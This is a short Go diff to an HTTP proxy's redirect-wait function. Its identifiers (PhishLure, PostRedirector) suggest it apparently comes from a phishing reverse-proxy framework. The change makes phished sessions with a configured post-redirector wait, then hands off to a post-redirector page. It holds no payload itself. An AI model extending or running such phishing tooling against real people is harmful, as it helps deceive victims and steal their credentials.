@@ -1788,6 +1788,21 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 	s, ok := p.sessions[session_id]
 	p.session_mtx.Unlock()
 	if ok {
+		// if a post-redirector is configured, don't return redirect URL here
+		// let the response handler serve the post-redirector page instead
+		if s.PhishLure != nil && s.PhishLure.PostRedirector != "" {
+			if s.IsDone {
+				return "", false
+			}
+			ticker := time.NewTicker(30 * time.Second)
+			select {
+			case <-ticker.C:
+				break
+			case <-s.DoneSignal:
+				return "", false
+			}
+			return "", false
+		}
 
 		if s.IsDone {
 			return s.RedirectURL, true
